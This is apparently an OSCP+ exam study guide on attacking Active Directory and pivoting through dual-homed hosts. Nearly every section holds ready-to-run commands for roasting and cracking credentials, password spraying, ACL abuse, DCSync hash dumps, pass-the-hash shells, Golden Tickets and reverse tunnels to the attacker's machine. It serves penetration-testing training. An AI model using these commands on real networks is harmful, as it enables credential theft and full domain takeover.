# OSCP+ KNOWLEDGE BASE — VOLUME 5
## ACTIVE DIRECTORY (breaking a Windows domain) + PIVOTING

> **Read this box first — it's the most important 40 points on the exam.**
>
> **What is Active Directory (AD)?** In companies, Windows computers and users aren't managed one-by-one — they're joined into a **domain** run by a central server called the **Domain Controller (DC)**. The DC holds every user, password, group, and computer. **Own the DC and you own everything.** The exam's AD set is 3 chained machines worth 40 points, all-or-nothing.
>
> **"Assumed breach":** the exam hands you one low-privilege domain username+password to start (you don't have to find the first foothold). Your job: use that to enumerate the domain, steal more credentials, hop from machine to machine, and eventually take over the DC.
>
> **Placeholders:** `$DC` = the Domain Controller's IP · `$DOMAIN` = the domain name (like `corp.local`) · `$U`/`$P` = a username/password you have · `$H` = an NTLM password hash · `<IP>` = your Kali IP.
>
> **⏰ Always fix the clock first for Kerberos.** AD's login system (Kerberos) refuses if your clock differs from the DC's by more than 5 minutes. Symptom: `KRB_AP_ERR_SKEW`. Fix: `sudo ntpdate $DC` (or `sudo rdate -n $DC`).
>
> **The whole AD game in one loop:** enumerate → map with BloodHound → get a credential → see what it unlocks → move to the next machine → repeat → reach the DC.

---

# [AD-QUICK]  the core AD commands  (one screen)
```bash
# 1) Test a credential and see WHERE it's admin ("Pwn3d!" = local admin on that host):
nxc smb <hosts> -u $U -p $P
# 2) Dump users/groups/policy/shares from the DC:
nxc smb $DC -u $U -p $P --users --groups --pass-pol --shares
# 3) Collect the whole domain map for BloodHound (do this EARLY):
bloodhound-python -u $U -p $P -d $DOMAIN -ns $DC -c all --zip
# 4) The two "free" credential attacks (see below):
impacket-GetNPUsers  $DOMAIN/ -dc-ip $DC -no-pass -usersfile users.txt   # AS-REP roast (needs NO password)
impacket-GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC                     # Kerberoast (needs any one password)
# 5) Spray a working cred across the whole subnet, then log in where you're admin:
nxc smb <subnet> -u $U -p $P --continue-on-success
evil-winrm -i <host> -u $U -p $P            # get a shell (WinRM), OR:
impacket-psexec $DOMAIN/$U:$P@<host>        # get a SYSTEM shell (SMB)
```

---

# [AD-ENUM]  enumerating the domain
**What you need:** network reach to the DC, and ideally one domain credential (the exam gives you one).
**Confirm it's a domain:** ports 88/389/445/135 open; `nxc smb $DC` prints the domain + hostname.
**Commands (with a credential):**
```bash
nxc smb  $DC -u $U -p $P --users                 # list every domain user
nxc smb  $DC -u $U -p $P --groups --pass-pol --shares   # groups (find the admins) + lockout policy + shares
nxc ldap $DC -u $U -p $P --users --groups        # same via LDAP — also shows 'description' fields (passwords hide there!)
ldapdomaindump -u "$DOMAIN\\$U" -p $P $DC -o ldd/  # dump everything to browsable HTML/JSON files
# with NO credential — pull usernames by cycling ID numbers:
nxc smb $DC -u '' -p '' --rid-brute
impacket-lookupsid $DOMAIN/$U:$P@$DC              # the domain's SID + every account:RID
# find attackable accounts in one shot:
nxc ldap $DC -u $U -p $P --kerberoasting kr.txt --asreproast ar.txt --trusted-for-delegation
```
**What in the output matters:** the **user list** (→ spray/roast), the **computer list**, **group memberships** (who are the admins?), the **password policy** (the lockout threshold tells you how safely you can spray), accounts with **SPNs** (Kerberoastable), accounts that **"do not require pre-auth"** (AS-REP roastable), and any **`description`** fields (admins hide passwords there).
**Next:** run BloodHound, do the roasts, spray your cred.

## [AD-USER]  building a username list + the password policy
- **Build a user list** from: LDAP/RID cycling, `enum4linux-ng`, SMTP enumeration, Kerbrute (`kerbrute userenum -d $DOMAIN --dc $DC users.txt`), the website, or files in shares. Common name formats: `first.last`, `flast`, `f.last`.
- **Check the password policy:** `nxc smb $DC -u $U -p $P --pass-pol`. The **lockout threshold** is how many wrong guesses lock an account. Spray *fewer* than that per time-window, then wait for the reset — or you'll lock people out and tip off the defender.

## [AD-SID]  Security Identifiers (SIDs) — the ID number behind every account
**What it is:** every user/group/computer in AD has a unique ID called a SID, like `S-1-5-21-3623811015-3361044348-30300820-1013`. The long middle part is the **domain's** ID; the **last number (the "RID")** identifies the specific account.
**RIDs worth knowing** (the last number):
```
500 = Administrator   501 = Guest   502 = krbtgt (the Kerberos master account)
512 = Domain Admins   513 = Domain Users   519 = Enterprise Admins   544 = local Administrators
```
**Why you care:** the **domain SID** (everything before the last number) is needed to forge "Golden Tickets" (`[KERBEROS-QUICK]`). Get it with `impacket-lookupsid`. On a shell: `whoami /user`. An RID ≥ 1000 = a normal created account; < 1000 = a built-in one.

## [AD-CREDENTIALS]  getting your first (or next) credential
In rough order of ease: **AS-REP roast (no creds needed) → spray weak/reused passwords → Kerberoast (needs any cred) → loot shares (GPP passwords, scripts, configs) → dump hashes from a machine you own → abuse an ACL "edge".**

## [AD-KERBEROAST]  Kerberoasting  → `[THINK-SPN]`
**What it is:** "service accounts" in AD have something called an SPN. **Any** valid domain user can ask the DC for a ticket for a service account — and that ticket is encrypted with the service account's password. You crack it offline to recover the password. Service accounts are often powerful.
**You need:** just one domain credential.
```bash
impacket-GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC -outputfile tgs.txt   # request the tickets → hashes into tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # crack (13100 = Kerberoast)
```
**You get:** the service account's cleartext password (if it's weak). **Next:** spray it everywhere; check that account in BloodHound (often an admin).
**Troubleshoot:** clock skew → `ntpdate $DC`; no SPN accounts → nothing to roast; won't crack → strong password, move on. **Targeted Kerberoast:** if you have `GenericWrite` on a user, you can *set* an SPN on them, roast, then remove it `[LOOK-UP]`.

## [AD-ASREP]  AS-REP roasting
**What it is:** some accounts are misconfigured with "Kerberos pre-authentication" turned off. For those, **anyone** — no password needed — can request a chunk of data encrypted with the user's password, then crack it offline.
**You need:** just a list of usernames.
```bash
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule    # crack (18200 = AS-REP)
```
**You get:** the cleartext of any weak-password account. **Next:** spray it + look that user up in BloodHound.

## [AD-ACL]  abusing object permissions (BloodHound "edges") — the AD mid-game
**What it is:** AD lets one account hold special rights over another (reset their password, add them to a group, etc.). If you control an account that has a dangerous right over a more powerful account, you take that account over — then repeat, climbing toward Domain Admin. **BloodHound draws these as arrows ("edges").** Here's what each edge means and how to abuse it:

| Edge (BloodHound name) | What it means | How to abuse it |
|---|---|---|
| **GenericAll** (on a user) | total control of that user | force-change their password, then log in as them |
| **GenericAll** (on a computer) | total control of that computer | RBCD or "shadow credentials" → authenticate as it |
| **GenericAll / Owns** (on a group) | control the group | add yourself to the group |
| **ForceChangePassword** | reset their password without the old one | set a new password, log in as them |
| **GenericWrite / WriteProperty** (user) | edit their attributes | set an SPN → targeted Kerberoast |
| **WriteDACL** | rewrite the permissions list | grant yourself GenericAll, then abuse it |
| **WriteOwner** | become the owner | set owner=you → grant GenericAll → abuse |
| **AddMember / AddSelf** | add members to a group | add yourself to a privileged group |
| **AllExtendedRights** (on domain) | includes DCSync | DCSync the whole domain |
| **AddKeyCredentialLink** | write a key credential | "Shadow Credentials" → get the account's NT hash |

**Commands (run these from Kali):**
```bash
# force-change a user's password (GenericAll / ForceChangePassword):
net rpc password "targetuser" "NewP@ss1" -U "$DOMAIN"/"$U"%"$P" -S $DC
bloodyAD -u $U -p $P -d $DOMAIN --host $DC set password targetuser 'NewP@ss1'
# add yourself to a group (GenericAll / AddMember on the group):
bloodyAD -u $U -p $P -d $DOMAIN --host $DC add groupMember "Target Group" $U
# WriteOwner → make yourself owner → grant yourself full control (a chain):
owneredit.py -action write -new-owner $U -target targetuser "$DOMAIN"/"$U":"$P"
dacledit.py  -action write -rights FullControl -principal $U -target targetuser "$DOMAIN"/"$U":"$P"
# Shadow Credentials (AddKeyCredentialLink) → get an NT hash:
certipy shadow auto -u $U@$DOMAIN -p $P -account targetuser
```
**You get:** control of the target account (its new password, hash, or ticket) → repeat up the graph.
**Troubleshoot:** password-complexity rules on force-change; clock skew for the certificate-based ones.

## [AD-DCSYNC]  domain takeover — steal every password hash
**What it is:** Domain Controllers replicate their database to each other. If your account has the "replication" right (Domain Admins have it, and BloodHound flags anyone else who does as "DCSync"), you can *pretend to be a DC* and ask for **all** password hashes — including the built-in Administrator and the `krbtgt` master key.
```bash
impacket-secretsdump $DOMAIN/$U:$P@$DC                          # dump ALL hashes (needs replication rights)
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$U:$P@$DC     # just krbtgt (→ Golden Ticket)
```
**You get:** the Administrator's NTLM hash (→ Pass-the-Hash into the DC), the `krbtgt` hash (→ forge Golden Tickets), and every user's hash. **This is game over.**

## [AD-LATERAL]  moving to another machine (with a working credential/hash)
**You need:** creds/hash that are **local admin** on the target (`nxc smb <host> -u.. -p..` shows `(Pwn3d!)`).
```bash
evil-winrm -i <host> -u $U -p $P                 # interactive shell over WinRM (if the account has WinRM rights)
evil-winrm -i <host> -u $U -H $H                 # same, but using a hash (Pass-the-Hash)
impacket-psexec  $DOMAIN/$U:$P@<host>            # SYSTEM shell over SMB (reliable but "loud")
impacket-wmiexec $DOMAIN/$U:$P@<host>            # quieter command execution
nxc smb <host> -u $U -p $P -x "whoami"           # run one quick command
nxc smb <host> -u $U -H $H --sam --lsa           # dump that host's stored creds
```
> **Pass-the-Hash (PtH):** log in with the NTLM *hash* instead of the password — `-hashes :$H` (impacket) or `-H $H` (nxc/evil-winrm). You often never need to crack it.
**On each new host:** loot its creds (secretsdump / LSASS) → new creds → repeat toward the DC.

## [AD-GPO]  abusing Group Policy → SYSTEM on every linked machine (even the DC)
**What it is:** Group Policy Objects (GPOs) push settings and scripts to groups of machines. If you have **write access to a GPO** (a BloodHound edge onto a GPO object), you can make it run a task as **SYSTEM** on every machine the GPO applies to — and if it's linked to the DC, that's domain compromise.
```bash
# Windows (SharpGPOAbuse) — add yourself as a local admin on the affected machines:
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "<GPO Name>"
# Linux (pyGPOAbuse):
pygpoabuse '<DOMAIN>/<user>:<pass>' -gpo-id <GUID> -command 'net localgroup administrators <you> /add'
gpupdate /force     # trigger it now (or wait ~90 min for the automatic refresh)
```
**You get:** SYSTEM / local admin on the linked machines → then DCSync (`[AD-DCSYNC]`) → domain compromise.
**Troubleshoot:** the GPO must be *linked* to an OU containing your target (an unlinked GPO does nothing).

## [AD-DELEGATION]  Kerberos delegation (recognise + basic abuse)
- **Unconstrained delegation:** if you take over such a host, you can trick a DC/admin into authenticating to it and capture their ticket → impersonate them `[LOOK-UP]`.
- **Constrained delegation:** `getST.py -impersonate administrator ...` → impersonate any user to the allowed service.
- **RBCD (Resource-Based Constrained Delegation):** if you can write to a computer object, add a machine account you control as "allowed to act", then impersonate → local admin on that computer `[LOOK-UP]`.

## [AD-BLOODHOUND]  the map that finds your path  → `[THINK-DOMAINUSER]`
**What it is:** BloodHound collects all the users, groups, computers, and permissions, then draws a graph so you can see the **shortest path to Domain Admin** instead of guessing.
```bash
bloodhound-python -u $U -p $P -d $DOMAIN -ns $DC -c all --zip     # collect from Kali (do it as soon as you have any cred)
# or on a Windows host:  SharpHound.exe -c all   → copy the zip to Kali
```
**Then:** open the BloodHound GUI, import the zip, mark your owned accounts as "Owned", and run the built-in queries "Shortest paths to Domain Admins" and "Shortest paths from Owned". Each **arrow** maps to an abuse recipe in `[AD-ACL]`.
**Troubleshoot:** collection fails → clock skew, wrong `-ns`/`-d`, or LDAP signing; GUI import errors → match the collector and GUI versions.

## [AD-ATTACK-PATH]  how a typical exam chain looks
```
start: assumed-breach credential
 → run BloodHound + Kerberoast + AS-REP + spray
 → crack a service/user password → reuse it → become local admin on a host
 → secretsdump that host → more hashes/creds → BloodHound "from owned"
 → abuse an ACL edge (GenericAll / WriteDACL / Shadow-Creds) up to a privileged user
 → that user can DCSync (or is a Domain Admin) → secretsdump the domain
 → Pass-the-Hash the Administrator into the DC and members → read every proof.txt
```
**Priorities:** always do the two free roasts + BloodHound first; always spray every new cred on every host; let BloodHound pick the path; take the shortest edge you can run with your Kali tools.

## [KERBEROS-QUICK]  Kerberos cheat-strip
```bash
Clock:        sudo ntpdate $DC                                            # fix KRB_AP_ERR_SKEW FIRST
AS-REP:       GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC   → crack -m 18200
Kerberoast:   GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC                   → crack -m 13100
Hash→Ticket:  getTGT.py $DOMAIN/$U -hashes :$H ; export KRB5CCNAME=$U.ccache ; then use -k -no-pass
DCSync:       secretsdump.py $DOMAIN/$U:$P@$DC
Golden Ticket:ticketer.py -nthash <krbtgt hash> -domain-sid <domain SID> -domain $DOMAIN administrator
```

## [AD-TROUBLESHOOTING]
| What you see | Cause / fix |
|---|---|
| `KRB_AP_ERR_SKEW` | clock skew → `sudo ntpdate $DC` |
| `STATUS_LOGON_FAILURE` | wrong creds/domain → try `-d $DOMAIN` or `$DOMAIN/user`; check case |
| `STATUS_ACCOUNT_RESTRICTION` | that account can't log on to that host/protocol |
| `STATUS_PASSWORD_EXPIRED` | reset it via `smbpasswd`/`rpc password` if allowed |
| Kerberoast returns nothing | no SPN accounts, or you forgot `-request` + a valid cred |
| PtH fails on WinRM but SMB says Pwn3d | the account lacks WinRM rights → use psexec/wmiexec |
| BloodHound collection fails | clock skew, LDAP signing, or wrong `-ns` |
| `secretsdump` DCSync "denied" | your account lacks replication rights — wrong path |
| relay says "signing:True" | can't NTLM-relay to a host with SMB signing on → find a `signing:False` host |

## [COMMON-RABBIT-HOLES ad]
- Grinding a Kerberoast hash that won't crack instead of trying other users/edges.
- Ignoring BloodHound and hunting the path by hand.
- Forgetting to spray a newly found password on **all** hosts.
- Trying to locally-privesc a host when the real path is "these creds are admin on *another* host" or an ACL edge.
- Not fixing clock skew and blaming your credentials.

---

# [PIVOT]  PIVOTING — reaching networks only the victim can see

> **What is pivoting?** Some machines have two network cards: one facing you, one facing a hidden internal network you can't reach directly. Once you own such a "dual-homed" machine, you tunnel *through* it so your Kali tools can attack the hidden subnet. That machine is the "pivot".

## [PIVOT-QUICK]  the two tools you need  (one screen)
```
Picture:  YOUR KALI  →(tunnel)→  PIVOT HOST (owned, dual-homed)  →  HIDDEN SUBNET (e.g. 172.16.5.x)

LIGOLO-NG (cleanest — gives you a real network route; no proxychains needed):
  ./proxy -selfcert                              # on KALI: start the ligolo relay
  sudo ip route add 172.16.5.0/24 dev ligolo     # on KALI: route the hidden subnet through the tunnel
  ./agent -connect <IP>:11601 -ignore-cert       # on the PIVOT host: connect back to your relay
  # in the ligolo console: session → start. Now run nmap/nxc against 172.16.5.x NATIVELY.

CHISEL (creates a SOCKS proxy you run tools through with proxychains):
  ./chisel server -p 8000 --reverse              # on KALI
  ./chisel client <IP>:8000 R:socks              # on the PIVOT host
  proxychains nxc smb 172.16.5.0/24              # prefix any tool with 'proxychains' to send it through the tunnel

SSH (if you have SSH creds on the pivot):
  ssh -D 1080 user@pivot                          # a SOCKS proxy → use with proxychains
  ssh -L 9000:172.16.5.10:445 user@pivot          # forward ONE internal host:port to your localhost:9000
```
**Rule:** through a SOCKS proxy, use **TCP-connect** scans only: `proxychains nmap -sT -Pn -n 172.16.5.10`. No UDP or ping over SOCKS.

## [PIVOT-SSH]  SSH port forwarding (get the direction right)
- **Local (`-L`):** opens a port **on your Kali** that tunnels to an internal `host:port` through the pivot. Use when *you* start the connection. `ssh -L 8080:internal-web:80 user@pivot` → browse `localhost:8080`.
- **Remote (`-R`):** opens a port **on the far side** that tunnels back to something *you* can reach. Use to expose your Kali listener to a segmented box.
- **Dynamic (`-D`):** a SOCKS proxy on Kali → run anything through proxychains. Best general option if you have SSH.
- Handy flags: `-N` (no shell), `-f` (background).

## [PIVOT-CHISEL]  details
- Reverse SOCKS (the pivot can't accept inbound but can reach you): `--reverse` server on Kali, `R:socks` client on the pivot. proxychains uses `socks5 127.0.0.1 1080`.
- Single port forward: `R:9000:172.16.5.10:3389` → RDP to `localhost:9000`.
- Transfer chisel to the pivot (`[FILETRANSFER-QUICK]`); match the architecture (linux/windows, x64).

## [PIVOT-LIGOLO]  details (preferred)
- Gives you a routed interface, so you run `nmap`/`nxc`/`evil-winrm` **natively** against the internal subnet (faster, and UDP works).
- Kali setup: `sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert`.
- Add a route for the hidden subnet to `dev ligolo`, then start the agent's session.
- To catch reverse shells from internal hosts, use ligolo's listener feature to expose your Kali listener to them.

## [PIVOT-ENUM]  what to do after you pivot
1. Find live hosts: `proxychains nxc smb 172.16.5.0/24` (or native with ligolo).
2. Port-scan them (TCP connect): `proxychains nmap -sT -Pn -n -p 445,3389,5985,88 172.16.5.10`.
3. Spray your creds/hashes across the new subnet; if it's AD, re-run BloodHound from the new perspective.

## [PIVOT-TROUBLESHOOTING]
| What you see | Cause / fix |
|---|---|
| proxychains "connection refused" | SOCKS not up / wrong port in `proxychains4.conf` (`socks5 127.0.0.1 1080`) |
| nmap through proxychains hangs | you used SYN/UDP → must be `-sT -Pn -n`; scan few ports |
| DNS fails through the proxy | use IPs, or add hosts to `/etc/hosts` |
| chisel client won't connect | pivot egress blocked → use port 80/443; confirm server `--reverse` |
| ligolo: no traffic | you forgot `ip route add <subnet> dev ligolo`, or didn't start the session |
| reverse shell from internal host never arrives | your listener isn't reachable → expose Kali via ligolo listener / chisel `R:` |
| binary won't run | wrong architecture — get linux-amd64 / windows-amd64 |

## [COMMON-RABBIT-HOLES pivot]
- SYN/UDP scanning over SOCKS (doesn't work). Scanning huge port ranges through a proxy (glacially slow — target specific ports). Forgetting the ligolo route. Wrong tunnel direction (`-L` vs `-R`). Not re-spraying creds on the new subnet.

---
*End Volume 5. Next: Volume 6 — quick lookups, troubleshooting, the tool encyclopedia, and the exam report.*
